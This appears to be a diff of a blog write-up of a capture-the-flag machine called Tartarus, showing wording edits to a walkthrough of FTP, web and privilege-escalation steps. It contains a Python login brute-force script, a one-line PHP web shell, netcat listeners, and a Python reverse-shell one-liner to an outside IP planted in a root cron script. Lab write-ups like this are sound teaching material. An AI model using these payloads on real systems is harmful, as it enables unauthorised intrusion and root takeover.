@@ -40,10 +40,10 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds</code></pre></div>
-<p>Ok, as you can see nmap has replied with 3 open ports being 21 (<strong>ftp</strong>), 22 (<strong>ssh</strong>) and 80 (<strong>http</strong>). Also, because we took advantage of <a href="">nmap-scripts</a>, we were able to get some additional juice, showing that FTP is allowing <strong>anonymous</strong> login and also that is hosting a file called <strong>test.txt</strong> which might be contain interesting information. </p>
+<p>Ok, as you can see nmap has replied with 3 open ports being 21 (<strong>ftp</strong>), 22 (<strong>ssh</strong>) and 80 (<strong>http</strong>). Also, because we took advantage of <a href="https://nmap.org/book/nse-usage.html">nmap-scripts</a>, we were able to get some additional juice, showing that FTP is allowing <strong>anonymous login</strong> and also that it is hosting a file called <strong>test.txt</strong>, which might contain interesting information. </p>
 <p>In parallel while I poke around, I usually like having nmap doing a full scan on background:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ nmap -Pn -p- tartarus.htm | tee -a nmap-all-ports</code></pre></div>
-<p>The reason for doing this wasn’t so much about finding exploitable versions but basically to understand whether there was some hidden gems running on any custom ports I should’ve know of. That wasn’t the case. </p>
+<p>The reason for doing this wasn’t so much about finding exploitable applications but basically to understand whether I should also expand my attention to any available custom ports. That wasn’t the case. </p>
 <h3>FTP (21) - Part I</h3>
 <p>In the meantime, I logged myself on the FTP server and grabbed the <strong>test.txt</strong> file. As you know by now, anonymous login was allowed:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">Name (tartarus.thm:hatecomputers): anonymous
@@ -70,7 +70,7 @@ ftp&gt; exit
 vsftpd test file</code></pre></div>
 <p>Which wasn’t necessarily useful. </p>
 <h3>Web (80) - Part I</h3>
-<p>I decided then to run <code class="language-text">curl</code> against the host, looking for any possible leaks. Performing a simple <code class="language-text">GET</code> request gave me this:</p>
+<p>I decided then, to run <strong>cURL</strong> against the host looking for any possible leaks. Performing a simple <code class="language-text">GET</code> request returned me this:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ curl -s -i tartarus.thm
 
 HTTP/1.1 200 OK
@@ -124,8 +124,7 @@ d&quot;&gt;
       />
   </a>
     </span></p>
-<p>Not very useful either, although default versions usually mean default configurations - and default passwords. Running <code class="language-text">Gobuster</code> was next logical step:</p>
-<p><em>P.S: If you yet don’t have <strong>SecList</strong> as part of your current workflow, make sure to grab it <a href="https://github.com/danielmiessler/SecLists">here</a>. Or if you doing from kali linux, you can do the same by apt -y install seclists. This should be available under <strong>/usr/share/</strong> directory.</em></p>
+<p>Not very useful either, although default versions usually mean default configurations - and default passwords if there are any places to log us in. Running <code class="language-text">Gobuster</code> was next logical step:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ gobuster dir -u http://tartarus.thm -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 20
 ===============================================================
 Gobuster v3.0.1
@@ -144,10 +143,11 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/09/28 09:16:08 Finished
 ===============================================================</code></pre></div>
-<p>Also found “nothing”. <strong>/server-status</strong> was available but forbidden. Worth pointing out I was starting to feel a little anxious already given this machine was flagged as easy but so far I hadn’t found anything. Shamelessly, I decided to run <code class="language-text">searchsploit</code> expecting to shed some light and yet, nothing. Took a quick break expecting to have some insights. It worked.</p>
+<p><em>P.S: If you yet don’t have <strong>SecList</strong> as part of your current workflow, make sure to grab it <a href="https://github.com/danielmiessler/SecLists">here</a>. Or if you doing from kali linux, you can do the same by apt -y install seclists. This should be available under <strong>/usr/share/</strong> directory.</em></p>
+<p>Also couldn’t find anything useful. <strong>/server-status</strong> was available but forbidden. Shamelessly then, I decided to run <strong>searchsploit</strong> expecting to shed some light and yet, it seemed there was no available exploits for any of the running applications. Took a quick for a coffee and came back. It worked.</p>
 <p>Turns out, I missed something quite obvious during my initial recon.</p>
 <h3>FTP (21) - Part II</h3>
-<p>I again log myself through FTP and this time took a better look around, this time not ignoring entries starting with <code class="language-text">.</code> when listing the files:</p>
+<p>I again got myself logged in on FTP but now looking more carefully at things:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">ftp&gt; ls -al
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -156,7 +156,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 -rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 ... 
 -rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
 226 Directory send OK.</code></pre></div>
-<p>If you are slightly comfortable with *nix environments, you know that <code class="language-text">.</code> means current directory, <code class="language-text">..</code> means previous directory but <code class="language-text">...</code> isn’t really a thing. So, someone named a directory <code class="language-text">...</code> deliberately. Interesting. Let’s check what is inside: </p>
+<p>If you are slightly comfortable with *nix environments, you know that <code class="language-text">.</code> alone means current directory, <code class="language-text">..</code> means previous directory but <code class="language-text">...</code> isn’t really a thing. So, someone deliberately named a directory <code class="language-text">...</code>. Interesting. Let’s have a look: </p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">ftp&gt; cd ...
 200 PORT command successful. Consider using PASV.
 ftp&gt; ls -al
@@ -165,16 +165,16 @@ ftp&gt; ls -al
 ftp&gt; get yougotgoodeyes.txt
 150 Here comes the directory listing.
 226 Directory send OK.</code></pre></div>
-<p>So there was indeed, a different file and the content was just <strong>/sUp3r-s3cr3t</strong>. Judging by the forward slash prefix, it stroke me as a potential web directory. I was right. Time to give the http server a go again.</p>
+<p>So there was indeed, a different file and the content was just <strong>/sUp3r-s3cr3t</strong>. Judging by the forward slash prefix, it stroke me as a potential web directory. It was. Time to give the http server a go again.</p>
 <h3>Web (80) - Part II</h3>
-<p>Presented with a login page, I tried a few default username/password combinations just to make sure I wasn’t really missing anything. Gobuster was already running in background and found a directory called <strong>/images</strong> (I’ve ran the same Gobuster as the one above but adding the /sUp3r-s3cr3t at the end of the url), which I couldn’t access.</p>
-<p>Also, while thinking about it, I previously assumed - <strong>n00b mistake</strong> - that since it was a default Apache setup, everything was also default so I didn’t bother checking. I went back and found <strong>/robots.txt</strong> was available, giving away a pretty important piece of information:</p>
+<p>Presented with a login page, I tried a few default username/password combinations just to make sure I wasn’t really missing anything. <strong>Gobuster</strong> was already running in background and found a directory called <strong>/images</strong> (I’ve ran the same <strong>Gobuster</strong> as the one above but adding the <strong>/sUp3r-s3cr3t</strong> at the end of the url), which I couldn’t access.</p>
+<p>Also, while initially poking around, I assumed - <strong>n00b mistake</strong> - that since it was a default Apache setup, everything was also default so I didn’t bother checking. I went back and found out that <strong>/robots.txt</strong> was available, giving away a pretty important piece of information:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">User-Agent: *
 Disallow: /admin-dir
 
 I told d4rckh we should hide our things deep</code></pre></div>
-<p>This led me to a open directory where I found two files: <strong>credentials.txt</strong> and <strong>userid</strong>. Both files contained what appeared to be a list of passwords and usernames.</p>
-<p>After investing some time trying to sort it out <code class="language-text">Hydra</code>’s terrible syntax that led me nowhere but frustration town, I decided to brute force my way in, scripting it myself. After manually poking with the login page to understand how it worked, I wrote this:</p>
+<p>This led me to a open directory where I also found two files: <strong>credentials.txt</strong> and <strong>userid</strong>. Both files contained what appeared to be a list of passwords and usernames.</p>
+<p>After investing some time trying to sort out <code class="language-text">Hydra</code>’s terrible syntax that led me nowhere, out of frustration I decided to brute force my way in scripting it myself. After manually poking with the login page to understand how it worked, I wrote this:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">#!/usr/bin/python3
 
 import requests;                                                                                    
@@ -208,14 +208,14 @@ for passwd in passwords:
     if response.status_code == 200 and response.text != &#39;Incorrect password!&#39;:
         print(f&#39;password {passwd}&#39;)
         break</code></pre></div>
-<p>The script is quite self explanatory. I basically replicated the same step-by-step I had previously executed manually to then, move that into actual piece of program that can repeat the tedious process of going through the both lists and validate all the possibilities. There might be better ways of doing so but I think being able to craft your own “exploits” as you go is a fine art. I suggest you to exercise that as much as you can.  </p>
-<p>Combining that woth both <strong>credentials</strong> and <strong>userid</strong> wordlists, I managed to find the user and password necessary (<strong>enox:P@ssword1234</strong>) so I could log in, which presented me with a “Upload your file” kind of page.</p>
+<p>The script is quite self explanatory. I basically replicated the same step-by-step I had previously executed manually to then, move that into actual piece of program that can repeat the tedious process of going through both lists and validate all the possibilities. There might be better ways of doing so but I think being able to craft your own “exploits” as you go is a fine art. I suggest you to exercise that as much as you can.  </p>
+<p>Combining that with both <strong>credentials</strong> and <strong>userid</strong> wordlists, I managed to find the user and password necessary (<strong>enox:P@ssword1234</strong>) so I could log in, which presented me with a “Upload your file” kind of page.</p>
 <h3>Getting a shell + user flag</h3>
 <p>I immediately created a simple php file with this and send it over: </p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">&lt;?php
 system($_GET[&#39;cmd&#39;])
 ?&gt;</code></pre></div>
-<p>I could go for the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentest monkey php reverse shell</a> but I usually try to make things as simple as I can. This gives me everything I need: <code class="language-text">system</code> function executes whenever command I would passed in, while the <code class="language-text">$_GET[&#39;cmd&#39;]</code> is a  request param I’ve sent (which I named <strong>cmd</strong>). </p>
+<p>I could’ve gone for the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentest monkey php reverse shell</a> but I usually try to make things as simple as I can. And honestly, this gives me everything I need: <code class="language-text">system</code> function executes whenever command I would passed in, while the <code class="language-text">$_GET[&#39;cmd&#39;]</code> is a request param I’ve sent (which I named <strong>cmd</strong>). </p>
 <p>Then I open up <strong>Burpsuite</strong>, went to directory where my php script landed. </p>
 <p><span
       class="gatsby-resp-image-wrapper"
@@ -249,7 +249,7 @@ system($_GET[&#39;cmd&#39;])
       />
   </a>
     </span></p>
-<p>Then, back to the terminal and I typed: </p>
+<p>Then, back to the terminal I typed: </p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ nc -vlp 4444</code></pre></div>
 <p>And just waited. </p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ nc -vlp 4444
@@ -270,7 +270,7 @@ drwxr-xr-x 5 root   root   4096 Jul  5 21:45 ..
 <p>This was enough to get user flag as you can see. Next, we move to privilege escalation. </p>
 <h3>Privesc + root flag</h3>
 <p>If you paid close attention to what was shown above, you noticed that along with the <strong>user.txt</strong>,
-there’s a <strong>cleanup.py</strong> script. You can tell it was originally created by the root but for whatever reason
+there’s was <strong>cleanup.py</strong> script. You can tell it was originally created by the root but for whatever reason
 we have all the permissions (read, write and execution). A quick <code class="language-text">cat</code> to reveal its content:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">www-data@ubuntu-xenial:/home/d4rckh$ cat cleanup.py                                                 
 #!/usr/bin/env python                                                                               
@@ -282,10 +282,10 @@ try:
         os.system(&#39;rm -r /home/cleanup/* &#39;)                                                         
 except:                                                                                             
         sys.exit()                      </code></pre></div>
-<p>It seems like its job (the kind of file that runs from time to time). I didn’t even check the cron jobs to see if there was something and just went with my gut. I then placed this piece of code on the top the script:</p>
+<p>It seemed to me - and I guess this comes with a little bit of practice - like it was job (the kind of file that runs from time to time). I didn’t even check the cron jobs to see if there was something and just went with my gut. I then placed this piece of code I took from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a> on the top the script:</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.84.24&quot;,4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bi
 n/sh&quot;,&quot;-i&quot;]);   </code></pre></div>
-<p>and again, waited (this time listening to the port <strong>4445</strong>). And after a minute or two(?):</p>
+<p>and again, waited (this time listening to the port <strong>4445</strong> however). After a minute or two(?):</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ nc -vlp 4445
 $ id                                
 id=0(root) gid=0(root) groups=0(root)
